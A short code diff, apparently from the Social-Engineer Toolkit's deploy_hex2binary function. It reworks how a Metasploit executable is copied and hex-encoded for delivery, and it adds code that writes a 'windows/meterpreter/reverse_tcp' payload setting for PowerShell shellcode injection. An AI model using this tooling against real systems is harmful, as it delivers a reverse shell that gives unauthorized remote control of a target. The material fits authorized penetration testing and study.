@@ -123,9 +123,13 @@ def deploy_hex2binary(ipaddr,port,username,password):
         if not os.path.isfile(setdir + "/set.payload"):
             if operating_system == "posix":
                 web_path = (setdir)
-                subprocess.Popen("cp %s/msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
-                subprocess.Popen("cp %s//msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
-        fileopen = file("%s/msf.exe" % (web_path), "rb")
+                # if it isn't there yet
+                if not os.path.isfile(setdir + "/1msf.exe"):
+                    # move it then
+                    subprocess.Popen("cp %s/msf.exe %s/1msf.exe" % (setdir, setdir), shell=True).wait()
+                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+        fileopen = file("%s/1msf.exe" % (web_path), "rb")
         # read in the binary
         data = fileopen.read()
         # convert the binary to hex
@@ -163,6 +167,10 @@ def deploy_hex2binary(ipaddr,port,username,password):
         update_options("PORT=" + port)
         update_options("POWERSHELL_SOLO=ON")
         print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+        filewrite = file(setdir + "/payload_options.shellcode", "w")
+        # format needed for shellcode generation
+        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
+        filewrite.close()
         try: reload(src.payloads.powershell.prep)
         except: import src.payloads.powershell.prep
         # create the directory if it does not exist
